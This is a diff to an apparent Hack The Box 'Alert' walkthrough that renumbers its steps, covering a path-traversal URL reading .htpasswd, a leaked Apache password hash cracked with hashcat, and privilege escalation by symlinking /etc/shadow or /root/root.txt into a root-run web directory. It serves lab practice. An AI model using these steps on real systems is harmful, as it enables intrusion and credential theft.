@@ -69,15 +69,13 @@ Easier to read with <https://www.urldecoder.org/>
 
 ![](images/media/image8.png)
 
-4.  asdf
-
-5.  PATCH TRAVERSAL: Create modified script
+4.  PATCH TRAVERSAL: Create modified script
 
 <http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd>
 
 ![](images/media/image9.png)
 
-6.  Upload that script on Website
+5.  Upload that script on Website
     [**http://alert.htb**](http://alert.htb)
 
 **Click View Markdown**
@@ -86,31 +84,31 @@ Easier to read with <https://www.urldecoder.org/>
 
 Right click -\> copy link
 
-7.  ![](images/media/image11.png){width="4.119104330708661in"
+6.  ![](images/media/image11.png){width="4.119104330708661in"
     height="3.6359995625546806in"}![](images/media/image12.png){width="4.11875in"
     height="1.044669728783902in"}
 
-8.  Upload copied LINK to **Contact** on
+7.  Upload copied LINK to **Contact** on
     **<http://alert.htb>/index.php?page=contact**
 
 ![](images/media/image13.png)
 
-9.  After you click on SEND, you'll get the displayed in Kali VM, the
+8.  After you click on SEND, you'll get the displayed in Kali VM, the
     **[HASH Password]{.mark}**
 
 **%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A**
 
 ![](images/media/image14.png)
 
-10. Convert it to cleartext on
+9. Convert it to cleartext on
     [www.urldecoder.org](http://www.urldecoder.org) or CyberChef
     <https://gchq.github.io/CyberChef>
 
 ![](images/media/image15.png)
 
-11. Create file **alert.hash** and paste hash in it
+10. Create file **alert.hash** and paste hash in it
 
-12. Crack it with **hashcat alert.hash /home/kali/Desktop/rockyou.txt**
+11. Crack it with **hashcat alert.hash /home/kali/Desktop/rockyou.txt**
 
 ![](images/media/image16.png)
 
@@ -121,14 +119,14 @@ RUN: cat user.txt
 
 **[PRIVILEGE ESCALATION]{.underline}**
 
-13. Transfer **linpeas.sh** to Server RUN: **scp linpeas.sh
+12. Transfer **linpeas.sh** to Server RUN: **scp linpeas.sh
     <albert@alert.htb>:**
 
 **INFO:** Terminal has to be opened in same directory as file linpeas.sh
 
 ![](images/media/image17.png)
 
-14. On server RUN: **./linpeas.sh**
+13. On server RUN: **./linpeas.sh**
 
 - **Port 8080 is open**
 
@@ -138,15 +136,15 @@ Look for interesting paths, like **/opt/ [(NEEDED in STEP 19)]{.mark}**
 
 ![](images/media/image19.png)
 
-15. PORT FORWARDING: **ssh -L 8080:127.0.0.1:8080 <albert@alert.htb>**
+14. PORT FORWARDING: **ssh -L 8080:127.0.0.1:8080 <albert@alert.htb>**
 
 ![](images/media/image20.png)
 
-16. Firefox access **127.0.0.1:8080**
+15. Firefox access **127.0.0.1:8080**
 
 ![](images/media/image21.png)
 
-17. Change directory to /opt/website-monitor and list all files
+16. Change directory to /opt/website-monitor and list all files
 
 -RUN: **cd /opt/website-monitor**
 
@@ -161,14 +159,14 @@ the application works. Check which directories have write permission
 
 ![](images/media/image22.png)
 
-18. You will see the contents of the monitors directory. You can open
+17. You will see the contents of the monitors directory. You can open
     these files through the browser.
 
 Open following in Browser: **http://127.0.0.1:8080/monitors/alert.htb**
 
 ![](images/media/image23.png)
 
-19. The application is running under the root user so you should be able
+18. The application is running under the root user so you should be able
     to read the **/etc/shadow** or **/root/root.txt**. Just create a
     symlink in the **monitors** directory and call it **root.txt**
 
